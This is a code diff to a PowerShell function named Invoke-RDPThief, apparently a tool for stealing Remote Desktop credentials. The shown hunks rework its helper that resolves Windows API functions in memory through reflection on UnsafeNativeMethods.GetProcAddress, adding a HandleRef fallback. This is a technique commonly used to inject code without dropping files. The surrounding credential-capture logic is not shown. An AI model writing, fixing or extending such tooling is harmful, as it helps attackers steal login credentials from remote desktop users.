@@ -1,7 +1,7 @@
 Function Invoke-RDPThief {
 
     function Invoke-FunctionLookup {
-        Param (
+            Param (
             [Parameter(Position = 0, Mandatory = $true)] 
             [string] $moduleName,
 
@@ -9,17 +9,22 @@ Function Invoke-RDPThief {
             [string] $functionName
         )
 
-        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
-            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
-        ).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $PtrOverload = $systemType.GetMethod("GetProcAddress", [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null)
 
-        $getProcAddressMethod = $systemType.GetMethods() | 
-        Where-Object { $_.Name -eq "GetProcAddress" }
+    if ($PtrOverload) {
 
         $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
-
-        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
+        return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
     }
+    else {
+    
+        $handleRefOverload = $systemType.GetMethod("GetProcAddress", [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)
+        $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
+        $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
+        return $handleRefOverload.Invoke($null, @($handleRef, $functionName))
+    }
+}
 
     function Invoke-GetDelegate {
         Param (
